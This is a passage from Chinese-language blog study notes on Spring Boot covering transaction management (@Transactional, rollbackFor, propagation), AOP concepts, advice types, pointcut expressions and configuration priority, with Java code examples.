层的方法上、类上、接口上</p><p>作用:将当前方法交给spring进行事务管理,方法执行前,开启事务;成功执行完毕，提交事务;出现异常,回滚事务</p><p><img src="/img/JavaWeb/2-2/5.png"></p><p>作用在接口/类，在调用此接口/类的，都会被执行。</p><p>一般都在增删改的方法上加此注解。</p><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@Transactional</span><br><span class="hljs-comment">//加上@Transactional后整个方法将变成事务（Spring事务管理）</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(Integer id)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            deptMapper.deleteById(id); <span class="hljs-comment">//根据ID删除部门数据</span><br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>/<span class="hljs-number">0</span>;<br>            <span class="hljs-comment">//if(true)&#123;throw new Exception(&quot;出错啦...&quot;);&#125;</span><br><br>            empMapper.deleteByDeptId(id); <span class="hljs-comment">//根据部门ID删除该部门下的员工</span><br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-type">DeptLog</span> <span class="hljs-variable">deptLog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeptLog</span>();<br>            deptLog.setCreateTime(LocalDateTime.now());<br>            deptLog.setDescription(<span class="hljs-string">&quot;执行了解散部门的操作,此次解散的是&quot;</span>+id+<span class="hljs-string">&quot;号部门&quot;</span>);<br>            deptLogService.insert(deptLog);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="事务进阶"><a href="#事务进阶" class="headerlink" title="事务进阶"></a>事务进阶</h4><h6 id="rollbackFor"><a href="#rollbackFor" class="headerlink" title="rollbackFor"></a>rollbackFor</h6><p>默认情况下，只有出现RuntimeException才回滚异常。rollbackFor属性用于控制出现何种异常类型，回滚事务 。</p><p>设置回滚异常类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(Integer id)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        deptMapper.deleteById(id); <span class="hljs-comment">//根据ID删除部门数据</span><br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>/<span class="hljs-number">0</span>;<br>        <span class="hljs-comment">//if(true)&#123;throw new Exception(&quot;出错啦...&quot;);&#125;</span><br><br>        empMapper.deleteByDeptId(id); <span class="hljs-comment">//根据部门ID删除该部门下的员工</span><br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-type">DeptLog</span> <span class="hljs-variable">deptLog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeptLog</span>();<br>        deptLog.setCreateTime(LocalDateTime.now());<br>        deptLog.setDescription(<span class="hljs-string">&quot;执行了解散部门的操作,此次解散的是&quot;</span>+id+<span class="hljs-string">&quot;号部门&quot;</span>);<br>        deptLogService.insert(deptLog);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="propagation"><a href="#propagation" class="headerlink" title="propagation"></a>propagation</h6><p>事务传播行为：指的就是当一个事务方法被另一个事务方法调用时，这个事务方法应该如何进行事务控制。</p><table><thead><tr><th>属性值</th><th>含义</th></tr></thead><tbody><tr><td>REQUIRED</td><td>[默认值]需要事务，有则加入，无则创建新事务</td></tr><tr><td>REQUIRES_ NEW</td><td>需要新事务，无论有无，总是创建新事务</td></tr><tr><td>SUPPORTS</td><td>支持事务，有则加入，无则在无事务状态中运行</td></tr><tr><td>NOT_SUPPORTED</td><td>不支持事务，在无事务状态下运行，如果当前存在已有事务,则挂起当前事务</td></tr><tr><td>MANDATORY</td><td>必须有事务，否则抛异常</td></tr><tr><td>NEVER</td><td>必须没事务，否则抛异常</td></tr></tbody></table><p>使用try-finally语句，即使上方执行异常，下方仍然可以正常操作（保障日志记录正常）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Transactional</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(Integer id)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            deptMapper.deleteById(id); <span class="hljs-comment">//根据ID删除部门数据</span><br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>/<span class="hljs-number">0</span>;<br>            <span class="hljs-comment">//if(true)&#123;throw new Exception(&quot;出错啦...&quot;);&#125;</span><br><br>            empMapper.deleteByDeptId(id); <span class="hljs-comment">//根据部门ID删除该部门下的员工</span><br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-type">DeptLog</span> <span class="hljs-variable">deptLog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeptLog</span>();<br>            deptLog.setCreateTime(LocalDateTime.now());<br>            deptLog.setDescription(<span class="hljs-string">&quot;执行了解散部门的操作,此次解散的是&quot;</span>+id+<span class="hljs-string">&quot;号部门&quot;</span>);<br>            deptLogService.insert(deptLog);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>如果只写一个@Transactional，如果出错，会导致日志写入后回滚，把日志删除</p><p>因此，在创建日志的记录中，使用@Transactional(propagation = Propagation.REQUIRES_NEW)，使其开启一个新事务这样就不会没有日志了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeptLogServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DeptLogService</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> DeptLogMapper deptLogMapper;<br><br>    <span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRES_NEW)</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(DeptLog deptLog)</span> &#123;<br>        deptLogMapper.insert(deptLog);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意：正在运行的事务只能有一个，原运行的事物会被挂起，而运行新事务。</p><p>REQUIRED：大部分情况下都是用该传播行为即可。</p><p>REQUIRES_ NEW：当我们不希望事务之间相互影响时，可以使用该传播行为。比如：下订单前需要记录日志，不论订单保存成功与否,都需要保证日志记录能够记录成功。</p><h2 id="八、AOP"><a href="#八、AOP" class="headerlink" title="八、AOP"></a>八、AOP</h2><h3 id="1、基础"><a href="#1、基础" class="headerlink" title="1、基础"></a>1、基础</h3><p>AOP：Aspect Oriented Programming（面向切面编程面向方面编程），其实就是面向特定方法编程。</p><p><img src="/img/JavaWeb/2-2/6.png"></p><p><img src="/img/JavaWeb/2-2/7.png"></p><h3 id="2、SpringAOP快速入门"><a href="#2、SpringAOP快速入门" class="headerlink" title="2、SpringAOP快速入门"></a>2、SpringAOP快速入门</h3><p>导入依赖：在pom.xml中导入AOP的依赖</p><p>SpringAOP是基于动态代理技术实现的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-aop<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>编写AOP程序：对于特定方法根据业务需要进行编程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Component</span>  <span class="hljs-comment">//交给AOP管理</span><br><span class="hljs-comment">//@Aspect //AOP类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimeAspect</span> &#123;<br><br>    <span class="hljs-comment">//@Around(&quot;execution(* com.itheima.service.impl.DeptServiceImpl.*(..))&quot;) //切入点表达式</span><br>    <span class="hljs-meta">@Around(&quot;com.itheima.aop.MyAspect1.pt()&quot;)</span> <span class="hljs-comment">//接入点表达式 //设置哪些方法需要统计耗时</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">recordTime</span><span class="hljs-params">(ProceedingJoinPoint joinPoint)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-comment">//1. 记录开始时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">begin</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br><br>        <span class="hljs-comment">//2. 调用原始方法运行</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> joinPoint.proceed();<br><br>        <span class="hljs-comment">//3. 记录结束时间, 计算方法执行耗时</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        log.info(joinPoint.getSignature()+<span class="hljs-string">&quot;方法执行耗时: &#123;&#125;ms&quot;</span>, end-begin);<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/JavaWeb/2-2/8.png"></p><h3 id="3、AOP基础"><a href="#3、AOP基础" class="headerlink" title="3、AOP基础"></a>3、AOP基础</h3><p>1.连接点：JoinPoint，可以被 AOP 控制的方法（暗含方法执行时的相关信息）</p><p>2.通知： Advice，指哪些重复的逻辑，也就是共性功能（最终体现为一个方法）</p><p>3.切入点：PointCut，匹配连接点的条件，通知仅会在切入点方法执行时被应用</p><p>4.切面：Aspect，描述通知与切入点的对应关系（通知+切入点）</p><p>5.目标对象：Target，通知所应用的对象</p><p><img src="/img/JavaWeb/2-2/9.png"></p><h3 id="4、AOP执行流程"><a href="#4、AOP执行流程" class="headerlink" title="4、AOP执行流程"></a>4、AOP执行流程</h3><p><img src="/img/JavaWeb/2-2/10.png"></p><h3 id="5、AOP通知类型"><a href="#5、AOP通知类型" class="headerlink" title="5、AOP通知类型"></a>5、AOP通知类型</h3><ol><li>@Around：环绕通知，此注解标注的通知方法在目标方法前、后都被执行</li><li>@Before：前置通知，此注解标注的通知方法在目标方法前被执行</li><li>@After：后置通知，此注解标注的通知方法在目标方法后被执行，无论是否有异常都会执行</li><li>@AfterReturning：返回后通知，此注解标注的通知方法在目标方法后被执行，有异常不会执行</li><li>@AfterThrowing：异常后通知，此注解标注的通知方法发生异常后执行</li></ol><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-comment">//@Aspect</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAspect1</span> &#123;<br><br>    <span class="hljs-meta">@Pointcut(&quot;execution(* com.itheima.service.impl.DeptServiceImpl.*(..))&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pt</span><span class="hljs-params">()</span>&#123;&#125;<br>    <span class="hljs-comment">//该注解的作用是将公共的切点表达式抽取出来，需要用到时引用该切点表达式即可。</span><br><br>    <span class="hljs-meta">@Before(&quot;pt()&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        log.info(<span class="hljs-string">&quot;before ...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Around(&quot;pt()&quot;)</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">around</span><span class="hljs-params">(ProceedingJoinPoint proceedingJoinPoint)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        log.info(<span class="hljs-string">&quot;around before ...&quot;</span>);<br><br>        <span class="hljs-comment">//调用目标对象的原始方法执行</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> proceedingJoinPoint.proceed();<br><br>        log.info(<span class="hljs-string">&quot;around after ...&quot;</span>);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-meta">@After(&quot;pt()&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        log.info(<span class="hljs-string">&quot;after ...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@AfterReturning(&quot;pt()&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterReturning</span><span class="hljs-params">()</span>&#123;<br>        log.info(<span class="hljs-string">&quot;afterReturning ...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@AfterThrowing(&quot;pt()&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterThrowing</span><span class="hljs-params">()</span>&#123;<br>        log.info(<span class="hljs-string">&quot;afterThrowing ...&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="6、AOP通知顺序"><a href="#6、AOP通知顺序" class="headerlink" title="6、AOP通知顺序"></a>6、AOP通知顺序</h3><h4 id="1-不同切面类中，默认按照切面类的类名字母排序："><a href="#1-不同切面类中，默认按照切面类的类名字母排序：" class="headerlink" title="1.不同切面类中，默认按照切面类的类名字母排序："></a>1.不同切面类中，默认按照切面类的类名字母排序：</h4><p>目标方法前的通知方法：字母排名靠前的先执行</p><p>目标方法后的通知方法：字母排名靠前的后执菏</p><h4 id="2-用-Order-数字-加在切面类上来控制顺序"><a href="#2-用-Order-数字-加在切面类上来控制顺序" class="headerlink" title="2.用@Order(数字)加在切面类上来控制顺序"></a>2.用@Order(数字)加在切面类上来控制顺序</h4><p>令目标方法前的通知方法：数字小的先执行</p><p>目标方法后的通知方法：数字小的后执行</p><h3 id="7、切入点表达式"><a href="#7、切入点表达式" class="headerlink" title="7、切入点表达式"></a>7、切入点表达式</h3><p>切入点表达式：描述切入点方法的一种表达式<br>作用：主要用来决定项目中的哪些方法需要加入通知<br>常见形式 ：</p><ol><li>execution (…) ：根据方法的签名来匹配</li><li>@annotationc(…) ：根据注解匹配</li></ol><h4 id="1-切入点表达式-execution（最常用）"><a href="#1-切入点表达式-execution（最常用）" class="headerlink" title="1.切入点表达式-execution（最常用）"></a>1.切入点表达式-execution（最常用）</h4><p>execution主要根据方法的返回值、包名、类名、方法名、方法参数等信息来匹配，语法为：</p><p><img src="/img/JavaWeb/2-2/11.png"></p><p>其中带?的表示可以省略的部分</p><ul><li>访问修饰符：可省略(比如: public、 protected)</li><li>包名.类名：可省略</li><li>throws异常：可省略(注意是方法上声明抛出的异常，不是实际抛出的异常)</li></ul><p>常用的切入点表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-comment">//@Aspect</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAspect7</span> &#123;<br><br>    <span class="hljs-comment">//匹配DeptServiceImpl中的 list() 和 delete(Integer id)方法</span><br>    <span class="hljs-meta">@Pointcut(&quot;execution(* com.itheima.service.DeptService.list()) || execution(* com.itheima.service.DeptService.delete(java.lang.Integer))&quot;)</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pt</span><span class="hljs-params">()</span>&#123;&#125;<br><br>    <span class="hljs-meta">@Before(&quot;pt()&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        log.info(<span class="hljs-string">&quot;MyAspect7 ... before ...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以使用通配符描述切入点：</p><p>单个独立的任意符号，可以通配任意返回值、包名、类名、方法名、任意类型的一个参数,也可以通配包、类、方法名的一部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">execution(* com.*. service.*.update*(*))<br></code></pre></td></tr></table></figure><p>多个连续的任意符号，可以通配任意层级的包，或任意类型、任意个数的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">execution(* com.itheima..DeptService.*(..))<br></code></pre></td></tr></table></figure><p>注意事项</p><p>根据业务需要，可以使用且(&amp;&amp;)、或(|)、非(!)来组合比较复杂的切入点表达式。</p><h4 id="2-切入点表达式-annotation（多一步，但灵活）"><a href="#2-切入点表达式-annotation（多一步，但灵活）" class="headerlink" title="2.切入点表达式-@annotation（多一步，但灵活）"></a>2.切入点表达式-@annotation（多一步，但灵活）</h4><p>@annotation 切入点表达式，用于匹配标识有特定注解的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@annotation(com.itheima.anno.Log)</span><br></code></pre></td></tr></table></figure><p>(1)编写一个注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(ElementType.METHOD)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyLog &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2)将方法添加注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-comment">//@Aspect</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAspect7</span> &#123;<br>    <span class="hljs-comment">//匹配DeptServiceImpl中的 list() 和 delete(Integer id)方法</span><br>    <span class="hljs-comment">//@Pointcut(&quot;execution(* com.itheima.service.DeptService.list()) || execution(* com.itheima.service.DeptService.delete(java.lang.Integer))&quot;)</span><br>    <span class="hljs-meta">@Pointcut(&quot;@annotation(com.itheima.aop.MyLog)&quot;)</span><br>    <span class="hljs-comment">//替换成@annotation</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pt</span><span class="hljs-params">()</span>&#123;&#125;<br><br>    <span class="hljs-meta">@Before(&quot;pt()&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        log.info(<span class="hljs-string">&quot;MyAspect7 ... before ...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8、连接点及其相关信息"><a href="#8、连接点及其相关信息" class="headerlink" title="8、连接点及其相关信息"></a>8、连接点及其相关信息</h3><p>在Spring中用JoinPoint抽象了连接点，用它可以获得方法执行时的相关信息，如目标类名、方法名、方法参数等。</p><p>对于@Around 通知，获取连接点信息只能使用ProceedingJoinPoint</p><p>对于其他四种通知，获取连接点信息只能使用JoinPoilt，它是ProceedingJoinPoint的父类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Aspect</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAspect8</span> &#123;<br><br>    <span class="hljs-meta">@Pointcut(&quot;execution(* com.itheima.service.DeptService.*(..))&quot;)</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pt</span><span class="hljs-params">()</span>&#123;&#125;<br><br>    <span class="hljs-meta">@Before(&quot;pt()&quot;)</span><br>    <span class="hljs-comment">// (JoinPoint joinPoint)获取连接点信息</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">(JoinPoint joinPoint)</span>&#123;<br>        log.info(<span class="hljs-string">&quot;MyAspect8 ... before ...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Around(&quot;pt()&quot;)</span><br>    <span class="hljs-comment">// (ProceedingJoinPoint joinPoint)获取连接点信息</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">around</span><span class="hljs-params">(ProceedingJoinPoint joinPoint)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        log.info(<span class="hljs-string">&quot;MyAspect8 around before ...&quot;</span>);<br><br>        <span class="hljs-comment">//1. 获取 目标对象的类名 .</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> joinPoint.getTarget().getClass().getName();<br>        log.info(<span class="hljs-string">&quot;目标对象的类名:&#123;&#125;&quot;</span>, className);<br><br>        <span class="hljs-comment">//2. 获取 目标方法的方法名 .</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> joinPoint.getSignature().getName();<br>        log.info(<span class="hljs-string">&quot;目标方法的方法名: &#123;&#125;&quot;</span>,methodName);<br><br>        <span class="hljs-comment">//3. 获取 目标方法运行时传入的参数 .</span><br>        Object[] args = joinPoint.getArgs();<br>        log.info(<span class="hljs-string">&quot;目标方法运行时传入的参数: &#123;&#125;&quot;</span>, Arrays.toString(args));<br><br>        <span class="hljs-comment">//4. 放行 目标方法执行 .</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> joinPoint.proceed();<br><br>        <span class="hljs-comment">//5. 获取 目标方法运行的返回值 .</span><br>        log.info(<span class="hljs-string">&quot;目标方法运行的返回值: &#123;&#125;&quot;</span>,result);<br><br>        log.info(<span class="hljs-string">&quot;MyAspect8 around after ...&quot;</span>);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="9、AOP案例"><a href="#9、AOP案例" class="headerlink" title="9、AOP案例"></a>9、AOP案例</h3><p>【稍后更新】</p><h2 id="九、Bean管理"><a href="#九、Bean管理" class="headerlink" title="九、Bean管理"></a>九、Bean管理</h2><h3 id="1、配置优先级"><a href="#1、配置优先级" class="headerlink" title="1、配置优先级"></a>1、配置优先级</h3><p>案例：</p><p>同一个属性，不同地方配置3次，最终哪一个生效</p><p><img src="/img/JavaWeb/2-2/12.png"></p><p>优先级：</p><p>1.application.properties</p><p>2.application.yml</p><p>3.application.yaml</p><p>注意事项：</p><p>虽然SpringBoot支持多种格式配置文件，但是在项目开发时，推荐统一使用一 种格式的配置(yml是主流)。</p><p>配置：</p><p>SpringBoot 除了支持配置文件属性配置，还支持Java系统属性和命令行参数的方式进行属性配置。（按顺序如下）</p><p>1.命令行参数</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">--server.port</span>=<span class="hljs-number">10010</span><br></code></pre></td></tr></table></figure><p>2.Java系统属性</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm">-<span class="hljs-type">Dserver</span>.<span class="hljs-keyword">port</span>=9000<br></code></pre></td></tr></table></figure><p>①执行maven打包指令package</p><p>tlias-web-management-0.0.1-SNAPSHOT.jar</p><p>②.执行java指令，运行jar包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -Dserver.port=<span class="hljs-number">9000</span> -jar tlias-web- management-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>-SNAPSHOT.jar --server.port=<span class="hljs-number">10010</span><br></code></pre></td></tr></table></figure><p>注意事项：</p><p>Springboot项目进行打包时，需要引入插件spring-boot -maven-plugin (基于官网骨架创建项目，会自动添加该插件)</p><p>优先级：</p><p><img src="/img/JavaWeb/2-2/13.png"></p><h3 id="2、Bean-管理"><a href="#2、Bean-管理" class="headerlink" title="2、Bean 管理"></a>2、Bean 